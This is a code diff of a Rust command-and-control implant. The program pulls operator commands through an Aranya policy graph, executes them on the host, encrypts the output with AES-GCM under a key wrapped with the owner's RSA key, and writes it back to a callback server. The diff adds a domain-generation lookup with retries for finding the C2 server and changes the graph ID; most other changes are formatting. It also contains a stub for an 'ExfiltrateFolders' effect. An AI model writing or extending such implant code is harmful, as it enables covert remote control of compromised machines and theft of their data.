@@ -1,36 +1,38 @@
 use c2::*;
 
+use crate::{
+    c2syncer::{C2Syncer, c2sync, new_quic_client, run_c2syncer},
+    common::{Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage},
+    policy::{Effect, get_owner_key},
+};
+use aes::{
+    Aes256,
+    cipher::{KeyInit, generic_array::GenericArray},
+};
+use aes_gcm::{AeadCore, Aes256Gcm, aead::Aead};
+use aranya_crypto::{Csprng, Rng};
+use aranya_policy_ifgen::Actionable;
+use aranya_runtime::{Sink, VmEffect, storage::GraphId};
+use machine_uid::machine_id;
+use rand::{RngExt, seq::IndexedRandom};
+use rsa::{BigUint, Oaep, RsaPublicKey, sha2::Sha256};
 use std::{
-    net::{
-        SocketAddr,
-        TcpStream,
-        IpAddr,
-        Ipv4Addr
-    },
-    sync::Arc,
-    path::{Path, PathBuf},
     fs,
     io::Write,
-    str::FromStr
+    net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream},
+    path::{Path, PathBuf},
+    str::FromStr,
+    sync::Arc,
 };
-use aes::{Aes256, cipher::{KeyInit, generic_array::GenericArray}};
-use aes_gcm::{AeadCore, Aes256Gcm, aead::Aead};
-use aranya_policy_ifgen::Actionable;
-use aranya_runtime::{storage::GraphId, Sink, VmEffect};
-use aranya_crypto::{Csprng, Rng};
-use machine_uid::machine_id;
-use rsa::{BigUint, Oaep, RsaPublicKey, sha2::Sha256};
-use tokio::time::{Duration, sleep};
-use crate::{c2syncer::{C2Syncer, c2sync, new_quic_client, run_c2syncer}, common::{Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage}, policy::{Effect, get_owner_key}};
 use tokio::sync::Mutex;
-use rand::{RngExt, seq::IndexedRandom};
+use tokio::time::{Duration, sleep};
 
 struct C2Sink {
     pub commands: Vec<String>,
     pub callback: Option<String>,
     // Owners current public key (n, e)
     pub n: Vec<u8>,
-    pub e: Vec<u8>
+    pub e: Vec<u8>,
 }
 
 impl C2Sink {
@@ -39,7 +41,7 @@ impl C2Sink {
             commands: Vec::new(),
             callback: None,
             n: Vec::new(),
-            e: Vec::new()
+            e: Vec::new(),
         }
     }
 }
@@ -61,17 +63,17 @@ impl Sink<VmEffect> for C2Sink {
         match eff {
             Effect::Command(cmd) => {
                 self.commands.push(cmd.cmdline.trim().to_string());
-            },
+            }
             Effect::QueryOwnerKeyResult(key) => {
                 self.n = key.n;
                 self.e = key.e;
-            },
+            }
             Effect::ExfiltrateFoldersEffect(folders) => {
                 // TODO: This
-            },
+            }
             Effect::UpdateCallbackC2Effect(callback) => {
                 self.callback = Some(callback.address.to_string());
-            },
+            }
             _ => {}
         }
     }
@@ -89,23 +91,19 @@ fn generate_random_directory() -> PathBuf {
         randdir[i] = rng.sample(rand::distr::Alphanumeric);
     }
 
-    return std::env::temp_dir()
-        .join(Path::new(std::str::from_utf8(&randdir).unwrap()));
+    return std::env::temp_dir().join(Path::new(std::str::from_utf8(&randdir).unwrap()));
 }
 
 fn main() {
-    // Enable logging to terminal 
+    // Enable logging to terminal
     tracing_subscriber::fmt().init();
 
     let args: Vec<String> = std::env::args().collect();
     let bind: SocketAddr = match args.len() {
-        1 => {
-            SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT)
-        },
-        _ => {
-            args[1].parse()
-                .expect("IPv4 address in wrong format i.e. 127.0.0.1:1234")
-        }
+        1 => SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT),
+        _ => args[1]
+            .parse()
+            .expect("IPv4 address in wrong format i.e. 127.0.0.1:1234"),
     };
 
     // Generate random directory
@@ -118,27 +116,47 @@ fn main() {
     let mut aranya = C2Client::new(basedir);
     let keys = aranya.create_new_keys();
     let deviceid = keys.ident_key.id().unwrap();
-    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
+    let policy = aranya
+        .create_policy(config::POLICY, deviceid)
+        .expect("Failed to create policy");
     let cs = aranya.init_aranya(policy);
 
     // let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
-    let graph = GraphId::from_str("CG2Fp2M4XTs1SGmT6i3LW83LP2X14USRcmEz6S8rjgde").unwrap();
+    let graph = GraphId::from_str("2JfxVCCwjDRhqr1wL2iSK4gasVZW5xHuVAEU4ZZcZFVr").unwrap();
     aranya.set_graph(graph);
 
     let mut syncer = C2Syncer::new(cs, sink);
 
-    let ips: Vec<std::net::IpAddr> =
-        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
+    // Retry a few times to get the DNS, if needed
+    let ips = {
+        let mut retries = 5;
+        let mut result: Vec<std::net::IpAddr> = Vec::new();
+        while retries > 0 {
+            let res = dns_lookup::lookup_host(
+                dga::generate_domain_now(config::DOMAIN).as_str()
+            );
+
+            if let Ok(ips) = res {
+                result = ips.collect();
+                break;
+            }
+
+            retries -= 1;
+        }
+
+        result
+    };
+
 
     for host in &ips {
-        syncer.connections.push(
-            SocketAddr::new(*host, config::PORT)
-        );
+        syncer
+            .connections
+            .push(SocketAddr::new(*host, config::PORT));
     }
 
     // Create new async runtime for the Aranya syncer.
     //   It needs a lot of stack memory
-    let rt = tokio::runtime::Builder::new_multi_thread()
+    let rt = tokio::runtime::Builder::new_current_thread()
         .thread_stack_size(100 * 1024 * 1024)
         .enable_all()
         .build()
@@ -153,13 +171,7 @@ fn main() {
 
         let syncer = Arc::new(Mutex::new(syncer));
 
-        tokio::spawn(
-            run_c2syncer(
-                Arc::clone(&syncer),
-                Arc::clone(&quic),
-                bind
-            )
-        );
+        tokio::spawn(run_c2syncer(Arc::clone(&syncer), Arc::clone(&quic), bind));
 
         // TODO: LOL i mean, it takes like 10 tries for it to 'parse peers' idk
         for i in 1..10 {
@@ -168,11 +180,12 @@ fn main() {
                     SocketAddr::new(*ip, config::PORT),
                     Arc::clone(&quic),
                     Arc::clone(&syncer),
-                    graph
-                ).await;
+                    graph,
+                )
+                .await;
             }
         }
-        
+
         let machineid = match machine_id::get_machine_id() {
             Ok(v) if v.len() > 0 => v,
             _ => {
@@ -185,7 +198,7 @@ fn main() {
         loop {
             sleep(Duration::from_millis(1000)).await;
 
-            let commands =  {
+            let commands = {
                 let syncer = &mut *syncer.lock().await;
                 let commands = syncer.sink.commands.clone();
                 syncer.sink.commands.clear();
@@ -227,7 +240,7 @@ fn main() {
                 let share = Aes256ShareMessage {
                     key: key.into(),
                     nonce: nonce.into(),
-                    machine_id: machineid.to_string()
+                    machine_id: machineid.to_string(),
                 };
 
                 println!("{:?}", share.nonce);
@@ -235,21 +248,26 @@ fn main() {
 
                 let command = CommandExecutionMessage::CommandExecuted {
                     stdout: out.stdout.to_vec(),
-                    stderr: out.stderr.to_vec()
+                    stderr: out.stderr.to_vec(),
                 };
 
                 let mut rng = Rng;
                 let message = FastChannelMessage {
-                    share: ownerkey.encrypt(
-                        &mut rng,
-                        Oaep::new::<Sha256>(),
-                        &postcard::to_allocvec(&share)
-                            .expect("Could not serialise share")
-                        ).expect("Failed to encrypt"),
+                    share: ownerkey
+                        .encrypt(
+                            &mut rng,
+                            Oaep::new::<Sha256>(),
+                            &postcard::to_allocvec(&share).expect("Could not serialise share"),
+                        )
+                        .expect("Failed to encrypt"),
                     command: aes
-                        .encrypt(&nonce, postcard::to_allocvec(&command)
-                        .expect("Could not serialise share").as_slice())
-                        .expect("Could not encrypt message")
+                        .encrypt(
+                            &nonce,
+                            postcard::to_allocvec(&command)
+                                .expect("Could not serialise share")
+                                .as_slice(),
+                        )
+                        .expect("Could not encrypt message"),
                 };
 
                 let Some(ref callback) = sink.callback else {
@@ -262,8 +280,7 @@ fn main() {
                     continue;
                 };
 
-                let data = postcard::to_allocvec(&message)
-                    .expect("Could not serialise message");
+                let data = postcard::to_allocvec(&message).expect("Could not serialise message");
 
                 stream.write(&data);
             }
